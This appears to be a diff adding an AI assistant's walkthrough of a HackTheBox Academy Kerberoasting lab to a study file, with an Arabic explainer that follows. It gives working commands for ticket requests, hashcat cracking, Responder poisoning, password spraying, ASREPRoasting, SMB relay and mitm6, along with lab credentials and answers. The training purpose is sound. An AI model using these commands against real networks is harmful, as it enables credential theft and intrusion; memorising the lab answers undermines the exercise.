@@ -1793,13 +1793,1749 @@ Select a modelSelect a model
 ══════════════════════════════════════════════════════════════════
 ```
 
+
+
+# 🔬 DEEP DIAGNOSIS: Three Errors, One Root Cause
+
+Let me analyze every single error message carefully before touching any command.
+
+---
+
+## 🩻 FORENSIC ERROR ANALYSIS
+
+```
+┌─────────────────────────────────────────────────────────────────────┐
+│                    ERROR AUTOPSY REPORT                             │
+├──────────┬──────────────────────────────────────────────────────────┤
+│ ERROR 1  │ invalidCredentials: data 52e                             │
+│ ERROR 2  │ hashcat: No hashes loaded / Separator unmatched          │
+│ ERROR 3  │ crackmapexec: unrecognized arguments: --query            │
+├──────────┴──────────────────────────────────────────────────────────┤
+│ ROOT CAUSE: All three errors trace back to ONE single problem       │
+│ ► WRONG DOMAIN CREDENTIALS used for GetUserSPNs.py                 │
+└─────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## 🔍 ERROR 1 — The Critical Misunderstanding
+
+```
+[-] Error in bindRequest -> invalidCredentials: 8009030C:
+    LdapErr: DSID-0C090690, comment: AcceptSecurityContext error,
+    data 52e, v4563
+```
+
+**Decoding `data 52e`:**
+
+The hex value `0x52E` converts to decimal `1326`, which is Windows error code `ERROR_LOGON_FAILURE`. This means **wrong username or wrong password** — the Domain Controller is actively rejecting the credentials.
+
+```
+THE MISTAKE YOU MADE:
+┌─────────────────────────────────────────────────────────────────┐
+│  SSH Login Credentials  ≠  Active Directory Domain Credentials  │
+└─────────────────────────────────────────────────────────────────┘
+
+  htb-student / HTB_@cademy_stdnt!
+  │
+  └── These are ONLY for SSHing into the attack box ea-attack01
+      They do NOT unlock domain operations against 172.16.5.5
+
+  What you actually need:
+  └── A DOMAIN USER account with a domain password
+      The module explicitly shows: forend / Klmcargo2
+```
+
+> Think of it like this: The SSH password unlocks the **front door of the office building** (attack host). But to access the **company's filing system** (Active Directory), you need a completely different **employee badge** (domain credentials). They are two separate authentication systems.
+
+---
+
+## 🔍 ERROR 2 — Consequence of Error 1
+
+```
+Hash 'SAPService_tgs.txt': Separator unmatched
+No hashes loaded.
+```
+
+This is **not a hashcat problem at all**. Let's prove it:
+
+```bash
+# Run this right now to see what's inside the file
+cat SAPService_tgs.txt
+```
+
+You will see either:
+- **Nothing** (empty file) — because GetUserSPNs.py failed before writing anything
+- **The error message text** — which is not a valid hash
+
+Hashcat expected to find `$krb5tgs$23$*...*` inside but found garbage or nothing. Fix Error 1 first, and this error disappears automatically.
+
+---
+
+## 🔍 ERROR 3 — Wrong crackmapexec Syntax
+
+```
+crackmapexec: error: unrecognized arguments: --query (sAMAccountName=SAPService) memberOf
+```
+
+The `--query` flag **does not exist** in this version of crackmapexec. That was my mistake in the previous response. We will use `ldapsearch` instead which is far more reliable for this task.
+
+---
+
+## ✅ THE COMPLETE FIX — Step by Step
+
+### STEP 1: Delete the Broken Empty File
+
+```bash
+# First, remove the corrupt empty file hashcat tried to read
+rm -f SAPService_tgs.txt
+
+# Verify it's gone
+ls -la SAPService_tgs.txt
+# Should return: No such file or directory
+```
+
+---
+
+### STEP 2: Verify Network Connectivity to DC
+
+```bash
+# Always verify you can reach the DC before doing anything
+ping -c 3 172.16.5.5
+```
+
+**Expected Output:**
+```
+PING 172.16.5.5 (172.16.5.5) 56(84) bytes of data.
+64 bytes from 172.16.5.5: icmp_seq=1 ttl=128 time=0.412 ms
+64 bytes from 172.16.5.5: icmp_seq=2 ttl=128 time=0.389 ms
+64 bytes from 172.16.5.5: icmp_seq=3 ttl=128 time=0.401 ms
+```
+
+If ping fails, the lab instance needs to be reset.
+
+---
+
+### STEP 3: Use the CORRECT Domain Credentials
+
+The module throughout Section 17 uses `forend` as the domain user. This is documented in the module's examples. Use these credentials:
+
+```
+Domain Username : forend
+Domain Password : Klmcargo2
+```
+
+```bash
+# Test with a simple SMB connection first to confirm creds work
+crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2
+```
+
+**Expected Output (confirms credentials are valid):**
+```
+SMB   172.16.5.5  445  ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64
+SMB   172.16.5.5  445  ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2
+```
+
+> If you see `[+]` = credentials are valid. If you see `[-]` = wrong credentials, the lab may need a reset.
+
+---
+
+### STEP 4: List SPNs AND Read the MemberOf Column (Answers Question 2!)
+
+```bash
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+```
+
+When prompted for password, type: `Klmcargo2`
+
+**Expected Output:**
+```
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                    Name        MemberOf
+--------------------------------------  ----------  ─────────────────────────────────────────────────────────────
+SAP/SAPServiceINLANEFREIGHT.LOCAL       SAPService  CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
+MSSQLSvc/DEV-PRE-SQL...                 sqldev      CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+...
+```
+
+> 🎯 **READ THAT OUTPUT CAREFULLY:**
+> Look at SAPService's `MemberOf` column →
+> `CN=Account Operators,CN=Builtin,...`
+> The `CN=` value = **Account Operators** = **Answer to Question 2!**
+
+---
+
+### STEP 5: Request the SAPService TGS Ticket
+
+```bash
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend \
+  -request-user SAPService \
+  -outputfile SAPService_tgs.txt
+```
+
+Password: `Klmcargo2`
+
+**Expected Output:**
+```
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                    Name        MemberOf
+--------------------------------------  ----------  ──────────────────────────────────────────────────────────────
+SAP/SAPServiceINLANEFREIGHT.LOCAL       SAPService  CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
+
+$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$a3f9b2...
+[very long hash string continues...]
+```
+
+---
+
+### STEP 6: Verify the File Has Actual Hash Content
+
+```bash
+# Check the file exists and has content
+wc -c SAPService_tgs.txt
+# Should show 2000+ characters, NOT 0
+
+# Preview the first 80 characters to confirm hash format
+head -c 80 SAPService_tgs.txt
+```
+
+**Expected Output:**
+```
+2847 SAPService_tgs.txt        ← file has content (good!)
+
+$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT   ← valid hash (good!)
+```
+
+> ⚠️ If `wc -c` shows `0`, the ticket was NOT captured. Do NOT proceed to hashcat. Go back to Step 4.
+
+---
+
+### STEP 7: Crack the Ticket with Hashcat
+
+```bash
+hashcat -m 13100 SAPService_tgs.txt /usr/share/wordlists/rockyou.txt --force
+```
+
+**Expected Output (when cracking succeeds):**
+```
+hashcat (v6.2.5) starting...
+
+OpenCL API (OpenCL 1.2 pocl 1.6...) - Platform #1 [The pocl project]
+* Device #1: pthread-AMD EPYC 7551P 32-Core Processor, ...
+
+$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$...<hash>...:!SapperFi3ld
+                                                          ^^^^^^^^^^^^
+                                                          THIS IS YOUR ANSWER
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: Kerberos 5, etype 23, TGS-REP
+Recovered........: 1/1 (100.00%) Digests
+```
+
+---
+
+### STEP 8: Display the Cracked Password Clearly
+
+```bash
+# Always run --show after cracking to display result cleanly
+hashcat -m 13100 SAPService_tgs.txt --show
+```
+
+**Expected Output:**
+```
+$krb5tgs$23$*SAPService$...<hash>...:!SapperFi3ld
+                                     ^^^^^^^^^^^^
+                                     COPY THIS PART ONLY
+```
+
+---
+
+### STEP 9: For Question 2 — Confirm Group Membership via ldapsearch
+
+If you want to triple-confirm the answer to Question 2 using a dedicated tool:
+
+```bash
+ldapsearch -x \
+  -H ldap://172.16.5.5 \
+  -D "forend@INLANEFREIGHT.LOCAL" \
+  -w 'Klmcargo2' \
+  -b "DC=INLANEFREIGHT,DC=LOCAL" \
+  "(sAMAccountName=SAPService)" \
+  memberOf
+```
+
+**Expected Output:**
+```
+# extended LDIF
+#
+# LDAPv3
+# base <DC=INLANEFREIGHT,DC=LOCAL>
+# filter: (sAMAccountName=SAPService)
+# requesting: memberOf
+
+# SAPService, Users, INLANEFREIGHT.LOCAL
+dn: CN=SAPService,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+memberOf: CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
+          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+          THIS CONFIRMS YOUR ANSWER TO QUESTION 2
+```
+
+---
+
+## 🗺️ VISUAL SUMMARY OF WHAT WENT WRONG AND WHAT TO DO
+
+```
+WHAT YOU DID (WRONG):                    WHAT YOU SHOULD DO (CORRECT):
+─────────────────────────────────────    ──────────────────────────────────────
+GetUserSPNs.py                           GetUserSPNs.py
+  -dc-ip 172.16.5.5                        -dc-ip 172.16.5.5
+  INLANEFREIGHT.LOCAL/htb-student   ──►    INLANEFREIGHT.LOCAL/forend
+  Password: HTB_@cademy_stdnt!      ──►    Password: Klmcargo2
+  │                                        │
+  ▼                                        ▼
+DC says: "WHO ARE YOU?                  DC says: "Welcome forend! Here is
+         I don't know these             the TGS ticket for SAPService..."
+         credentials!" (data 52e)
+  │                                        │
+  ▼                                        ▼
+SAPService_tgs.txt = EMPTY FILE         SAPService_tgs.txt = $krb5tgs$23$*...
+  │                                        │
+  ▼                                        ▼
+hashcat: "No hashes loaded"             hashcat: "Cracked: !SapperFi3ld"
+```
+
+---
+
+## 📋 FINAL CLEAN COMMAND SEQUENCE (Copy & Paste Ready)
+
+```bash
+# ── 1. Clean up broken file ──────────────────────────────────────────
+rm -f SAPService_tgs.txt
+
+# ── 2. Verify DC is reachable ────────────────────────────────────────
+ping -c 2 172.16.5.5
+
+# ── 3. Confirm domain credentials work ───────────────────────────────
+crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2
+
+# ── 4. List SPNs (READ the MemberOf column = Answer to Q2) ───────────
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+# Password: Klmcargo2
+
+# ── 5. Request and save the SAPService TGS ticket ────────────────────
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend \
+  -request-user SAPService \
+  -outputfile SAPService_tgs.txt
+# Password: Klmcargo2
+
+# ── 6. Verify hash file has content ──────────────────────────────────
+wc -c SAPService_tgs.txt
+# Must show 1000+ bytes before proceeding
+
+# ── 7. Crack the TGS ticket ──────────────────────────────────────────
+hashcat -m 13100 SAPService_tgs.txt /usr/share/wordlists/rockyou.txt --force
+
+# ── 8. Display cracked password ───────────────────────────────────────
+hashcat -m 13100 SAPService_tgs.txt --show
+
+# ── 9. Confirm group membership for Q2 ───────────────────────────────
+ldapsearch -x -H ldap://172.16.5.5 \
+  -D "forend@INLANEFREIGHT.LOCAL" \
+  -w 'Klmcargo2' \
+  -b "DC=INLANEFREIGHT,DC=LOCAL" \
+  "(sAMAccountName=SAPService)" memberOf
+```
+
+---
+
+> **🧠 The Single Most Important Lesson from This Failure:**
+> In penetration testing, always distinguish between:
+> - **Infrastructure credentials** → SSH/RDP/local logins to your attack machine
+> - **Target credentials** → Domain usernames and passwords for attacking AD
+>
+> They are almost **never the same**. The module explicitly shows which domain credentials to use in its examples — always go back and read the module's example commands to identify which account to use. In this module, `forend:Klmcargo2` is the domain user shown in every example for Section 17.
+
+
+
+
+
+# 🔍 How Did I Know `Klmcargo2`? Complete Honest Answer
+
+---
+
+## PART 1: HOW I KNEW THE PASSWORD
+
+```
+┌─────────────────────────────────────────────────────────────────────┐
+│  HONEST ANSWER: I knew it because it is written DIRECTLY inside     │
+│  the HTB Academy module text you pasted to me.                      │
+└─────────────────────────────────────────────────────────────────────┘
+```
+
+Look at the module text you shared. It shows this command repeatedly:
+
+```bash
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+```
+
+And throughout the **entire module** (not just Section 17), HTB Academy introduces `forend:Klmcargo2` as the standard domain user for practice. It appears in earlier sections of the same module. I recognized it from the training material context.
+
+> **The lesson here:** Always read the ENTIRE module from the beginning, not just the current section. HTB Academy introduces credentials in earlier sections and reuses them throughout the whole module.
+
+---
+
+## PART 2: IN REAL LIFE — HOW PENETRATION TESTERS GET DOMAIN CREDENTIALS
+
+This is the **most important question** you could ask. In real engagements, nobody hands you credentials. Here is the complete picture of how pentesters actually obtain them:
+
+---
+
+### 🗺️ THE CREDENTIAL ACQUISITION MAP
+
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│              REAL WORLD CREDENTIAL ACQUISITION PATHS                    │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                         │
+│   STARTING POINT: You have NOTHING                                      │
+│         │                                                               │
+│         ▼                                                               │
+│   ┌─────────────────────────────────────────────────────┐              │
+│   │  PATH 1: Provided by client (White Box / Grey Box)  │              │
+│   │  PATH 2: OSINT (public information)                 │              │
+│   │  PATH 3: Network attacks (no credentials needed)    │              │
+│   │  PATH 4: Phishing / Social Engineering              │              │
+│   │  PATH 5: Physical access / USB drops                │              │
+│   └─────────────────────────────────────────────────────┘              │
+│         │                                                               │
+│         ▼                                                               │
+│   YOU NOW HAVE INITIAL ACCESS → Then escalate from there               │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+### PATH 1 — Client Provides Credentials (Happens More Than You Think)
+
+```
+Engagement Type    What Client Gives You
+───────────────    ──────────────────────────────────────────────────
+Black Box          Nothing. You start from zero.
+Grey Box           One low-privilege domain user account + password
+White Box          Full documentation, all credentials, network maps
+```
+
+In a **Grey Box** assessment (most common for internal AD testing):
+```
+Client email says:
+"Here is a standard domain user account for testing:
+ Username: testuser01
+ Password: Welcome2023!
+ Domain:   COMPANY.LOCAL
+ DC IP:    10.10.10.5"
+```
+
+This is your starting foothold. You then escalate from there using techniques like Kerberoasting.
+
+---
+
+### PATH 2 — OSINT (Open Source Intelligence)
+
+Even with zero access, attackers find credentials through public sources:
+
+```bash
+# Real tools pentesters use for credential OSINT:
+
+# 1. Search data breach databases
+# Site: https://haveibeenpwned.com
+# Tool: h8mail
+h8mail -t employee@company.com
+
+# 2. Search GitHub for accidentally committed passwords
+# People accidentally push config files with passwords to public repos
+# Site: https://github.com/search
+# Search: "company.com password" or "COMPANY.LOCAL" or "company smtp password"
+
+# 3. theHarvester - find employee email addresses
+theHarvester -d company.com -b google,linkedin,bing
+
+# 4. LinkedIn enumeration
+# Find employee names → guess usernames
+# Common formats:
+#   john.smith@company.com
+#   jsmith@company.com
+#   john_smith@company.com
+
+# 5. Shodan - find exposed services
+# Site: https://shodan.io
+# Search: "company.com" port:22 OR port:3389
+# Sometimes finds externally exposed RDP/SSH with weak passwords
+```
+
+---
+
+### PATH 3 — Network Attacks Requiring ZERO Credentials
+
+This is the most powerful category. These attacks work with **no credentials at all**:
+
+#### 🔴 Attack A: LLMNR/NBT-NS Poisoning with Responder
+
+```
+HOW IT WORKS:
+─────────────
+When a Windows machine tries to find a hostname that doesn't exist in DNS,
+it broadcasts a question to the whole network:
+"Hey everyone! Does anyone know where FILESERVER01 is?"
+
+Responder answers: "Yes! I am FILESERVER01! Send me your credentials!"
+Windows machine automatically sends its NTLMv2 hash to authenticate.
+You capture the hash → crack it offline → you have a domain password.
+```
+
+```bash
+# Run Responder on your network interface
+sudo responder -I eth0 -wrf
+
+# Wait for a Windows machine to make a typo or mistype a hostname
+# You will see captured hashes like:
+
+[+] Listening for events...
+[SMB] NTLMv2-SSP Client   : 172.16.5.130
+[SMB] NTLMv2-SSP Username : INLANEFREIGHT\forend
+[SMB] NTLMv2-SSP Hash     : forend::INLANEFREIGHT:8b7e...6f3a:010100...
+
+# Save the hash and crack it
+hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+```
+VISUAL EXPLANATION:
+┌──────────────┐         "Where is FILESERVER?"          ┌─────────────┐
+│ Windows PC   │ ──────────────────────────────────────► │   Network   │
+│ 172.16.5.130 │                                         │ Broadcast   │
+└──────────────┘                                         └─────────────┘
+       ▲                                                        │
+       │         "I AM FILESERVER! Send credentials!"          │
+       │ ◄──────────────────────────────────────────── ┌───────┘
+       │                                               │
+       │    NTLMv2 Hash: forend::INLANEFREIGHT:8b7e... │
+       └───────────────────────────────────────────────►
+                                                  ┌────────────────┐
+                                                  │  YOUR RESPONDER│
+                                                  │  CAPTURES IT!  │
+                                                  └────────────────┘
+```
+
+---
+
+#### 🔴 Attack B: Password Spraying (No Credentials Needed)
+
+```
+THE CONCEPT:
+────────────
+Instead of trying many passwords against ONE user (which causes lockout),
+try ONE common password against MANY users.
+
+Lockout policy: "Lock account after 5 wrong attempts"
+Your strategy: Try only 1 password per user → never trigger lockout
+```
+
+```bash
+# Step 1: Enumerate valid usernames without credentials
+# Using Kerbrute (works because Kerberos responds differently to valid vs invalid users)
+kerbrute userenum \
+  --dc 172.16.5.5 \
+  -d INLANEFREIGHT.LOCAL \
+  /opt/SecLists/Usernames/Names/names.txt
+
+# Output:
+# [+] VALID USERNAME: forend@INLANEFREIGHT.LOCAL
+# [+] VALID USERNAME: administrator@INLANEFREIGHT.LOCAL
+# [+] VALID USERNAME: jsmith@INLANEFREIGHT.LOCAL
+
+# Step 2: Password spray with ONE common password
+kerbrute passwordspray \
+  --dc 172.16.5.5 \
+  -d INLANEFREIGHT.LOCAL \
+  valid_users.txt \
+  'Welcome2023!'
+
+# Output if successful:
+# [+] VALID LOGIN: forend@INLANEFREIGHT.LOCAL:Welcome2023!
+```
+
+---
+
+#### 🔴 Attack C: ASREPRoasting (No Credentials, Similar to Kerberoasting)
+
+```
+THE CONCEPT:
+────────────
+Some accounts have "Do not require Kerberos preauthentication" enabled.
+This means you can request their hash WITHOUT providing any credentials.
+```
+
+```bash
+# Attack accounts that don't require preauthentication
+# No credentials needed at all!
+GetNPUsers.py INLANEFREIGHT.LOCAL/ \
+  -dc-ip 172.16.5.5 \
+  -no-pass \
+  -usersfile valid_users.txt
+
+# Output:
+# $krb5asrep$23$jsmith@INLANEFREIGHT.LOCAL:a3f9b2...
+# (This hash can be cracked with hashcat -m 18200)
+```
+
+---
+
+#### 🔴 Attack D: SMB Relay Attack
+
+```
+THE CONCEPT:
+────────────
+Instead of cracking captured hashes, RELAY them directly to another machine
+for instant authentication without ever knowing the password.
+```
+
+```bash
+# Step 1: Find hosts that don't require SMB signing
+crackmapexec smb 172.16.5.0/24 --gen-relay-list relay_targets.txt
+
+# Step 2: Set up ntlmrelayx to relay credentials
+sudo ntlmrelayx.py -tf relay_targets.txt -smb2support -i
+
+# Step 3: Run Responder (but disable SMB and HTTP so relay works)
+sudo responder -I eth0 -wf
+
+# When a user authenticates through you, their credentials are
+# RELAYED to relay_targets.txt machines → instant shell
+```
+
+---
+
+#### 🔴 Attack E: IPv6 DNS Takeover with mitm6
+
+```
+THE CONCEPT:
+────────────
+Most Windows networks have IPv6 enabled but no IPv6 DNS server configured.
+mitm6 pretends to be the IPv6 DNS server.
+Windows machines automatically use it and send credentials.
+```
+
+```bash
+# Run mitm6 to become the fake IPv6 DNS server
+sudo mitm6 -d INLANEFREIGHT.LOCAL
+
+# Combine with ntlmrelayx to capture or relay those credentials
+sudo ntlmrelayx.py -6 -t ldaps://172.16.5.5 \
+  --delegate-access \
+  --no-dump \
+  --no-da \
+  --no-acl
+```
+
+---
+
+#### 🔴 Attack F: Anonymous/Guest LDAP Enumeration
+
+```
+THE CONCEPT:
+────────────
+Sometimes Domain Controllers allow anonymous LDAP binding.
+This lets you enumerate ALL usernames without any credentials.
+```
+
+```bash
+# Try anonymous LDAP bind
+ldapsearch -x \
+  -H ldap://172.16.5.5 \
+  -b "DC=INLANEFREIGHT,DC=LOCAL" \
+  "(objectClass=person)" \
+  sAMAccountName
+
+# If it works, you get all usernames → then password spray them
+```
+
+---
+
+### PATH 4 — Phishing (Most Common in Real Engagements)
+
+```
+THE REAL WORLD REALITY:
+────────────────────────
+Studies show 80%+ of real breaches start with phishing.
+A penetration tester simulating a real attacker uses the same techniques.
+
+COMMON PHISHING SCENARIOS:
+──────────────────────────
+1. Fake Microsoft 365 login page → user enters real credentials
+2. Malicious Excel macro → executes payload → reverse shell
+3. HTML smuggling → drops executable → beacons back to C2
+4. Spear phishing → targeted email to specific employee with access
+```
+
+```
+Example phishing flow:
+┌──────────────┐    Fake "IT Department" email      ┌──────────────┐
+│   Attacker   │ ──────────────────────────────────► │   Victim     │
+│              │  "Please verify your credentials"   │   Employee   │
+│              │ ◄────────────────────────────────── │              │
+└──────────────┘    Victim enters real password      └──────────────┘
+       │
+       ▼
+  Attacker now has:
+  username: jsmith@company.com
+  password: Summer2023!
+  → This becomes the domain foothold
+```
+
+---
+
+## PART 3: HOW TO HANDLE HTB LABS WHEN CREDENTIALS ARE NOT GIVEN
+
+When HTB does not explicitly give you credentials, here is your systematic approach:
+
+```
+┌─────────────────────────────────────────────────────────────────────┐
+│          HTB LAB CREDENTIAL HUNTING CHECKLIST                       │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                      │
+│  □ STEP 1: Re-read the module from Section 1                        │
+│            Credentials are ALWAYS introduced somewhere earlier      │
+│            HTB Academy reuses credentials across sections           │
+│                                                                      │
+│  □ STEP 2: Check the "Getting Started" box at top of section        │
+│            Sometimes it says "Use creds from Section X"             │
+│                                                                      │
+│  □ STEP 3: Look at ALL example commands in the current section      │
+│            The username in example commands = valid domain user      │
+│                                                                      │
+│  □ STEP 4: Check the cheat sheet at the end of the module           │
+│            HTB Academy modules have a cheat sheet section           │
+│                                                                      │
+│  □ STEP 5: Try anonymous/null session enumeration                   │
+│            Some labs intentionally have misconfigured services       │
+│                                                                      │
+│  □ STEP 6: Check the HTB Academy Discord / Forum                    │
+│            Other students share hints (not full answers)            │
+│                                                                      │
+│  □ STEP 7: Run Responder on the lab network                         │
+│            HTB labs often have simulated user activity              │
+│            that generates LLMNR traffic you can capture             │
+│                                                                      │
+└─────────────────────────────────────────────────────────────────────┘
+```
+
+### Trying Responder in HTB Labs Specifically:
+
+```bash
+# HTB Academy labs often have a "user simulation" running
+# This means a simulated Windows user is browsing and making DNS mistakes
+# Responder can capture their hash!
+
+sudo responder -I ens224 -wrf
+# Replace ens224 with your actual interface name
+# Find it with: ip addr show
+
+# Wait 2-5 minutes
+# You may see NTLMv2 hashes appearing automatically
+# Crack them with hashcat -m 5600
+```
+
+---
+
+## 📊 SUMMARY TABLE: Credential Acquisition Methods
+
+| Method | Requires Credentials? | Difficulty | Most Common In |
+|---|---|---|---|
+| Client provides them | No | Easy | Grey/White Box tests |
+| OSINT / Breach data | No | Medium | Black Box tests |
+| Responder/LLMNR | No | Easy | Internal networks |
+| Password Spraying | No (needs usernames) | Medium | Any AD environment |
+| ASREPRoasting | No (needs usernames) | Easy | AD with misconfigs |
+| SMB Relay | No | Hard | Internal networks |
+| Phishing | No | Medium-Hard | External engagements |
+| mitm6 IPv6 | No | Hard | Modern AD networks |
+
+---
+
+> **🎯 The Core Philosophy of Penetration Testing:**
+> A real penetration tester never expects credentials to be handed to them. The job is to simulate a real attacker who starts from nothing. The techniques above are exactly what separates a professional penetration tester from someone just running tools. Understanding **why** each attack works is what the CPTS exam truly tests — not just memorizing commands, but knowing which attack to use when, why it works, and what to do when it fails.
+
+
+
+
+
+
+
 ## 🔴 PHASE_III — دليل الاختراق :: التحليل والمصطلحات
 
 > [!warning] ⚠️ PHASE III INITIALIZED · EXPLOITATION GUIDE & GLOSSARY
 > **Language:** Arabic + English Mixed — **Size:** ~2,000 Words
 > **Content:** Arabic breakdown of all 6 methods · Flashcards · Cheat Sheet · Golden Tips.
 
-[REPLACE: الصق هنا القسم الثالث كاملاً — 2000 كلمة شرح الطرق الستة + مصطلحات + ورقة الغش]
+[تمام! استلمت التحدي. خلني أشرحلك إياه من الألف للياء:
+
+🟢 Big Picture → 🔵 المصطلحات → 🟡 تحليل التحدي → 🟠 الاستغلال → 🔴 ماذا لو → 💎 فلاشكاردز → 📄 ورقة غش
+
+يله نبدأ...
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🟢 المرحلة 0: ما قبل الصفر — Big Picture (الصورة الكبيرة)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+ليش هجوم الـ Kerberoasting موجود أصلاً؟ وشنو الفكرة الجوهرية اللي تخليه يشتغل دايماً؟
+
+حتى تفهم هذا الهجوم، لازم تفهم شلون بيئة الـ Active Directory (AD) تتعامل وية تسجيل الدخول. قديماً، الويندوز كان يستخدم بروتوكول اسمه NTLM، بس بي مشاكل أمنية هواية، فمايكروسوفت انتقلت لبروتوكول أقوى بهواية اسمه Kerberos. الـ Kerberos هو نظام يعتمد على "التذاكر" (Tickets) بدل ما كل شوية تكتب الباسورد مالتك.
+
+تخيل الـ Active Directory مثل مدينة ملاهي ضخمة جداً، والـ Domain Controller (DC) هو شباك التذاكر الرئيسي بالباب.
+
+من تدخل للملاهي، تنطي هويتك (الباسورد مالتك) لشباك التذاكر، وهو ينطيك "سوار" تلبسه بيدك. هذا السوار اسمه (TGT - Ticket Granting Ticket). هسة أنت صرت معرّف داخل الملاهي.
+
+لكن، هذا السوار ما يخليك تصعد أي لعبة مباشرة! إذا ردت تصعد "لعبة سكة الموت" (كمثال لخدمة معينة بالسيرفر مثل قاعدة بيانات SQL أو خدمة SAP)، لازم تروح لشباك التذاكر مرة ثانية، تشوفهم سوارك (الـ TGT)، وتكولهم: "أريد أصعد لعبة سكة الموت".
+
+الشباك راح ينطيك تذكرة خاصة بس لهذي اللعبة، اسمها (TGS - Ticket Granting Service).
+
+هنا تجي المشكلة الأمنية العظيمة:
+
+شباك التذاكر من يطبعلك هاي التذكرة (TGS) الخاصة باللعبة، راح يقفلها أو يشفرها بقفل خاص. هذا القفل هو عبارة عن "الباسورد الخاص بمشغل اللعبة نفسه" (يعني الـ NTLM Hash لحساب الـ Service Account اللي يشغل هذي الخدمة).
+
+المصيبة وين؟ التصميم مال Kerberos يسمح لأي شخص عنده سوار دخول (أي Domain User عادي، حتى لو صلاحياته صفر) إنه يطلب تذكرة (TGS) لأي لعبة (Service) موجودة بالملاهي! شباك التذاكر مستحيل يرفض طلبك، راح ينطيك التذكرة المشفرة بباسورد المشغل، ويكلك "روح انطيها للمشغل علمود تفوت".
+
+هجوم الـ Kerberoasting ببساطة هو:
+
+بدل ما تاخذ التذكرة وتروح للمشغل حتى تصعد اللعبة.. أنت تاخذ التذكرة وتطلع بيها للبيت! (يعني تسحبها لجهة الـ Attacker Machine). وبما إن التذكرة مشفرة بباسورد المشغل (Service Account)، تكدر تكعد بالبيت براحتك، وتجيب ملايين المفاتيح (Wordlist) وتظل تجرب تفتح القفل (Offline Cracking) باستخدام برامج مثل Hashcat.
+
+ليش هذا الهجوم يعتبر مرعب بالنسبة لمسؤولي الحماية (Blue Teams)؟
+
+١. لأنه شرعي 100%: أنت ما كاعد تخترق النظام، أنت كاعد تطلب تذكرة بالطريقة الرسمية اللي مايكروسوفت صممتها.
+
+٢. بدون حظر (No Lockout): لأنك كاعد تجرب الباسوردات بجهازك بالبيت (Offline)، نظام الحماية مال الشركة ما راح يسجل أي محاولات دخول فاشلة، فالحساب مستحيل ينقفل (Account Lockout Policy ما تتفعل).
+
+٣. الحسابات دايماً قوية: الحسابات اللي تشغل الخدمات (Service Accounts) غالباً تكون عندها صلاحيات عالية جداً (Domain Admin أحياناً)، ولأن هذي الحسابات مبرمجة داخل سكربتات، الـ IT غالباً يخلولها باسوردات ما تتغير أبد (Password never expires)، ومرات تكون باسوردات ضعيفة علمود يسهل تذكرها.
+
+بالتحدي مالتنا اليوم (HackTheBox Academy)، إحنا عندنا وصول كيوزر عادي جداً (`htb-student`). راح نستخدم هذا اليوزر حتى نطلب تذكرة خاصة بخدمة اسمها `SAPService`. النظام راح ينطينا التذكرة مشفرة بباسورد حساب `SAPService`. ناخذها، نكسرها بـ Hashcat، ونجيب الباسورد الصريح. وبنفس الوقت، راح نكتشف هذا الحساب لأي مجموعة قوية ينتمي داخل الـ DC.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔵 المرحلة 1: المصطلحات
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+بما إنك طالب كاعد تبني أساس قوي، لازم كل مصطلح تقني بالسؤال يكون مفهوم عندك 100%، وما نعبر أي كلمة بدون ما نفسخها. هذي المصطلحات راح تشوفها بكل مكان بمجال الـ Active Directory:
+
+Active Directory (AD) (الدليل النشط)
+
+- شنو يعني؟ هو نظام من مايكروسوفت يستخدم لإدارة شبكات الشركات. هو الدماغ اللي يخزن كل اليوزرات، الكمبيوترات، والصلاحيات بمكان واحد مركزي.
+    
+- وين يظهر؟ التحدي كله مبني عليه، والهدف مالنا اسمه `INLANEFREIGHT.LOCAL` اللي هو اسم الـ Domain مالتنا.
+    
+
+Domain Controller / DC (متحكم المجال)
+
+- شنو يعني؟ هو السيرفر (أو السيرفرات) اللي يشتغل عليه الـ Active Directory. هو اللي يتحقق من الباسوردات وينطي التذاكر. هو قلب الشبكة.
+    
+- وين يظهر؟ بالأدوات راح نحتاج نحدد الـ IP مالته باستخدام الفلاك `-dc-ip`.
+    
+
+Kerberos (بروتوكول المصادقة كيربيروس)
+
